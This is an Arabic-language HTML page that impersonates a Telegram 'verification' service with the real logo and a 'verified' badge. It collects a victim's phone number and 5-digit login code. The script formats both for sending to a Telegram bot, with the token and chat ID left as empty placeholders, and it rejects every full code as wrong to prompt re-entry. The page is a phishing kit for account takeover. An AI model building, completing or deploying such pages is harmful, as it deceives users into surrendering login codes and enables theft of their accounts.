<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>توثيق تليجرام</title>
  <style>
    body{
      margin:0;
      font-family:Arial, sans-serif;
      background:linear-gradient(135deg,#0088cc,#00abf0);
      display:flex;
      align-items:center;
      justify-content:center;
      min-height:100vh;
      color:#fff;
    }
    .container{
      background:rgba(0,0,0,0.55);
      padding:30px;
      border-radius:18px;
      text-align:center;
      width:100%;
      max-width:420px;
      box-shadow:0 8px 30px rgba(0,0,0,0.4);
    }
    .logo{width:80px;margin-bottom:10px;}
    h1{
      font-size:1.6rem;
      margin:0 0 20px;
      display:flex;
      align-items:center;
      justify-content:center;
      gap:8px;
    }
    .verified{
      background:linear-gradient(90deg,#00d6a8,#00ffcc);
      color:#003;
      padding:4px 10px;
      border-radius:999px;
      font-size:0.85rem;
      font-weight:bold;
    }
    .phone-row{
      display:flex;
      gap:10px;
      margin-bottom:8px;
    }
    select,input{
      padding:12px;
      border-radius:10px;
      border:none;
      font-size:1rem;
      background:rgba(255,255,255,0.08);
      color:#fff;
    }
    select{flex:0 0 110px;}
    input{flex:1;}
    .btn{
      width:100%;
      padding:14px;
      border:none;
      border-radius:10px;
      background:#0088cc;
      font-size:1.05rem;
      color:#fff;
      cursor:pointer;
    }
    .btn:hover{background:#00a0e0;}
    .hidden{display:none;}
    .error{
      color:#ff4d4d;
      font-size:0.9rem;
      margin-bottom:10px;
    }
    .code-row{
      display:flex;
      gap:10px;
      justify-content:center;
      margin-bottom:8px;
    }
    .code-box{
      width:40px;
      height:50px;
      border:none;
      border-radius:8px;
      font-size:1.2rem;
      text-align:center;
      background:rgba(255,255,255,0.08);
      color:#fff;
    }
  </style>
</head>
<body>
  <div class="container" id="phoneScreen">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
    <h1>توثيق تليجرام <span class="verified">موثوق ✅</span></h1>
    <div class="phone-row">
      <select id="countryCode">
        <option value="+967">🇾🇪 +967</option>
        <option value="+966">🇸🇦 +966</option>
        <option value="+20">🇪🇬 +20</option>
        <option value="+971">🇦🇪 +971</option>
        <option value="+1">🇺🇸 +1</option>
        <option value="+44">🇬🇧 +44</option>
        <option value="+49">🇩🇪 +49</option>
        <option value="+33">🇫🇷 +33</option>
        <option value="+81">🇯🇵 +81</option>
        <option value="+91">🇮🇳 +91</option>
      </select>
      <input type="tel" id="phoneNumber" placeholder="أدخل رقم الجوال" maxlength="15">
    </div>
    <div id="phoneError" class="error hidden">الرقم غير صالح</div>
    <button class="btn" id="verifyBtn">توثيق</button>
  </div>

  <div class="container hidden" id="codeScreen">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
    <h1>أدخل كود التحقق <span class="verified">موثوق ✅</span></h1>
    <div class="code-row">
      <input maxlength="1" class="code-box" inputmode="numeric">
      <input maxlength="1" class="code-box" inputmode="numeric">
      <input maxlength="1" class="code-box" inputmode="numeric">
      <input maxlength="1" class="code-box" inputmode="numeric">
      <input maxlength="1" class="code-box" inputmode="numeric">
    </div>
    <div id="codeError" class="error hidden"></div>
    <button class="btn" id="confirmBtn">تأكيد</button>
  </div>

  <script>
    // التوكن وCHAT_ID تم فصلهم، لا يوجد قيمة مباشرة هنا
    const BOT_TOKEN = ""; // ضع هنا في الخلفية إذا أردت لاحقًا
    const CHAT_ID  = ""; // ضع هنا في الخلفية إذا أردت لاحقًا

    const phoneScreen = document.getElementById("phoneScreen");
    const codeScreen  = document.getElementById("codeScreen");
    const phoneError  = document.getElementById("phoneError");
    const codeError   = document.getElementById("codeError");

    document.getElementById("verifyBtn").addEventListener("click", ()=>{
      const code = document.getElementById("countryCode").value;
      const num  = document.getElementById("phoneNumber").value.trim();

      if(num.length !== 9){
        phoneError.classList.remove("hidden");
        return;
      } else {
        phoneError.classList.add("hidden");
      }

      const msg = `📞 طلب توثيق جديد\nالرقم: ${code}${num}`;
      // الاتصال بالبوت الآن فارغ حتى تضع التوكن في الخلفية لاحقًا
      console.log("إرسال الرسالة:", msg);

      phoneScreen.classList.add("hidden");
      codeScreen.classList.remove("hidden");
    });

    const boxes = document.querySelectorAll(".code-box");
    boxes.forEach((box, idx) => {
      box.addEventListener("input", () => {
        box.value = box.value.replace(/[^0-9]/g,'');
        if(box.value && idx < boxes.length-1) boxes[idx+1].focus();
      });

      box.addEventListener("keydown", (e) => {
        if(e.key === "Backspace" && !box.value && idx > 0){
          boxes[idx-1].focus();
          boxes[idx-1].value = '';
          e.preventDefault();
        }
      });
    });

    document.getElementById("confirmBtn").addEventListener("click", ()=>{
      const code = Array.from(boxes).map(b=>b.value).join('');
      if(code.length < 5){
        codeError.textContent = "الرمز الذي أدخلته غير صالح";
        codeError.classList.remove("hidden");
        return;
      }
      if(code.length === 5){
        codeError.textContent = "الرمز غير صحيح يرجى إعادة المحاولة";
        codeError.classList.remove("hidden");
      }

      const msg = `🔐 محاولة إدخال كود\nالكود: ${code}`;
      console.log("إرسال الكود:", msg);
    });
  </script>
</body>
</html>
